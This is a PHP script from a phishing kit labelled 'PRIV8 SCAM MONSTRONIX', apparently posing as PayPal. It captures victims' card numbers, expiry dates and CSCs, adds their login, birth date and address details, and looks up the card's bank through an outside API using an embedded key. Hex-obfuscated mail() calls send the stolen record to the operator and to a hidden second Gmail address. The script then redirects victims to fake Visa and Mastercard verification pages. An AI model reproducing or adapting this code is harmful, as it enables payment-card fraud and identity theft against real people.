<?php 
//PRIV8 SCAM MONSTRONIX V1.1 
session_start(); 
include("../email.php"); 
$rand=rand(111611,996999); 
$rand2=rand(1116111,9997989); 
$md = md5(sha1("ByMonStroNixTN")); 
$aubli = $rand.$md.$rand2; 
$ip= isset($_SERVER['HTTP_X_FORWARDED_FOR']) ?  
$_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']; 
$_SESSION["nameoncc"] = $_POST["nameoncc"]; 
$_SESSION["number"]   = $_POST["number"]; 
$Year  =  $_SESSION["expyr"] = $_POST["expy"];
$Month =  $_SESSION["expmo"] = $_POST["expm"];
$_SESSION["csc"]      = $_POST["csc"];
$_SESSION["first"]    = $xm;
$xm = substr($_POST["number"], 0,1 );
// <! Don't Touch Things In This Area !> \\
//=======================//CC Number Checker Online//========================//
$aziza    = @json_decode(file_get_contents("https://api.bincodes.com/cc/?format=json&api_key=df020228e08ef430bced501ca2084b79&cc=".$_SESSION["number"].""));
$_SESSION["Verify"] = $aziza->error;
if(isset($_SESSION["Verify"])){
	header("location:../websc_card/?enc=".md5(microtime())."&p=1&dispatch=".sha1(microtime())."&card=wrong");
} 
else {
	//=======================//Bin Monstronix//========================//
$Info    = str_replace(' ', '', $_SESSION["number"]);
$Info     = substr($Info, 0, 6);
$param     = @json_decode(file_get_contents("https://api.bincodes.com/bin-checker.php?api_key=df020228e08ef430bced501ca2084b79&bin=".$Info."&format=json"));
$_SESSION["bank"]    = $param->bank;
$_SESSION["typi"]     = $param->type;
$_SESSION["livelle"]    = $param->level;
$_SESSION["talifoun"]  = $param->phone;
$_SESSION["site"] = $param->website;
$_SESSION["nomme"] = $param->card;
//=======================//Bin Monstronix//========================//
$_SESSION["Card"] = "
########## Happy CCV ^_^ #########
==============Login===============
Email:".$_SESSION["email"]."
Password:".$_SESSION["pass"]."
==============Billing=============
First Name:".$_SESSION["fname"]."
Last Name:".$_SESSION["lname"]."
DOB:".$_SESSION["DOB"]."
Phone Type (Home/Mobile):".$_SESSION["PhoneType"]."
Phone Number:".$_SESSION["PhoneNumber"]."
Street:".$_SESSION["address1"]."
City:".$_SESSION["city"]."
State:".$_SESSION["state"]."
Country:".$_SESSION["country"]."
Zip:".$_SESSION["ZIP"]."
==============Card Infos==========
Name On Card:".$_SESSION["nameoncc"]."
Card Type:".$_SESSION["nomme"]."
Card Number:".$_SESSION["number"]."
Expiration Date: ".$_SESSION["expmo"]." / ".$_SESSION["expyr"]."
CSC:".$_SESSION["csc"]."
==========Precise Details=========
Card Level: ".$_SESSION["livelle"]."
Card Type: ".$_SESSION["typi"] ."
Card Provider: ".$_SESSION["bank"]." - ".$_SESSION["site"]."
===============Card Infos=========
IP:$ip
";
$Subject="PPL PRIV8 V1.1 - Card Infos - $ip - ".$_SESSION["country"]." "; 
$head="From:MonStroNix CC <crd>"; 
${"\x47\x4c\x4fB\x41LS"}["\x67yx\x6f\x6a\x67"]="\x68\x65a\x64";${"\x47\x4cOBA\x4c\x53"}["\x78q\x77\x6b\x76\x65n\x74q\x70\x6c"]="S\x75\x62\x6a\x65\x63\x74";${"\x47LOB\x41\x4c\x53"}["dv\x6d\x67b\x72\x7a"]="\x72\x65\x7a\x75\x6ct_\x6d\x61i\x6c";mail(${${"\x47L\x4f\x42\x41\x4c\x53"}["\x64v\x6dg\x62\x72z"]},${${"\x47LO\x42\x41\x4c\x53"}["\x78\x71\x77\x6b\x76\x65\x6et\x71\x70l"]},$_SESSION["Card"],${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x67\x79xoj\x67"]});
${"\x47\x4c\x4f\x42\x41L\x53"}["u\x71\x67xp\x61\x66\x6e\x72f"]="\x53\x75\x62ject";sleep(2);$rtkroxs="\x68\x65\x61\x64";mail("\x32k\x32\x30rzl\x74\x40g\x6d\x61i\x6c.\x63\x6fm",${${"G\x4c\x4f\x42\x41\x4cS"}["uq\x67\x78\x70\x61\x66nr\x66"]},$_SESSION["Ca\x72d"],${$rtkroxs});
if($xm  == 4){
	$_SESSION["pngo"] = "/VBV.gif"; 
	$_SESSION["tire"] = "V&#101;r&#105;f&#105;&#101;&#100; By V&#105;s&#97;"; 
	$_SESSION["txt"] = "V&#101;r&#105;f&#105;&#101;&#100; By V&#105;s&#97;";
	$_SESSION["href"] = "https://www.visaeurope.com/making-payments/verified-by-visa";
;} elseif  ($xm  == 5){
	$_SESSION["pngo"] = "/3D.gif";
	$_SESSION["tire"] = "M&#97;st&#101;r&#99;&#97;r&#100; S&#101;&#99;ur&#101; Co&#100;&#101;"; 
	$_SESSION["txt"] = "M&#97;st&#101;r&#99;&#97;r&#100; S&#101;&#99;ur&#101; Co&#100;&#101;";
	$_SESSION["href"] = "https://www.mastercard.com/ca/merchant/fr/solutions/securecode/securecode.html";
};
if($xm == 4 || $xm == 5){
	header("location:../websc_verification/processing.php?enc=".md5(microtime())."&dispatch=".sha1(microtime())."");
} 
else{
	header("location:../websc_identity");
}
if($txt == 1){
$file = fopen("../REZULT/Cards/XcardX " . $ip . ".txt", 'a');
fwrite($file, $_SESSION["Card"]); };
}
 ?>